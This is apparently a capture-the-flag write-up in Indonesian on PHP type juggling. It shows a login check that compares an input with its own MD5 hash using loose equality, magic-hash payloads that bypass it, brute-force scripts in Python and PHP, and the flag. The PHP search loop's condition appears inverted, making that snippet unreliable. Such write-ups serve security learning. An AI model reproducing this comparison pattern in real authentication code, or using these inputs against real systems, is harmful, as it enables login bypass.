Lanjut dengan Authentication yang ke 2 :D

Link : https://web.ctf.rasyidmf.com/chal39/

```
<?php
include './flag.php';
    include '../app.php';

    if(GET::GETS("source") != "") {
        echo file_get_contents("code.txt");
        return;
    }

    $auth = POST::GET("auth");
    if ($auth != "") {
        if ($auth == md5($auth)) {
            $msg = "Here is your flag " . $flag . "<br>";
        } else {
            $msg = "Authentikasi gagal!<br>";
        }
    }
?>
```

Referensi : 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
https://medium.com/@Q2hpY2tlblB3bnk/php-type-juggling-c34a10630b10
https://www.netsparker.com/blog/web-security/php-type-juggling-vulnerabilities/

Simple Payload:
```
0e215962017
0e1137126905
```

Cari Manual (Python)
```
import hashlib
import re

prefix = '0e'


def breakit():
    iters = 0
    while 1:
        s = prefix + str(iters)
        hashed_s = hashlib.md5(s.encode()).hexdigest()
        iters = iters + 1
        r = re.match('^0e[0-9]{30}', hashed_s)
        if r:
            print ("[+] found! md5( {} ) ---> {}".format(s, hashed_s))
            print ("[+] in {} iterations".format(iters))
            exit(0)

        if iters % 1000000 == 0:
            print ("[+] current value: {}       {} iterations, continue...".format(s, iters))

breakit()
```

Cari Manual (PHP)
```
<?php
echo "running script";
 $base = "0e";
 $result = "";
 $curr_number = 0; 
 do {
  $curr = $base . "$curr_number";
  $result = md5($curr);
  $curr_number += 1;
  }
 while ($curr == $result);
echo "\n";
echo $curr;
echo "\n";
echo $result;
echo "\n";
```

Flag
```
CTFR{php_c0mp4r1510n_4r3_g00d}
```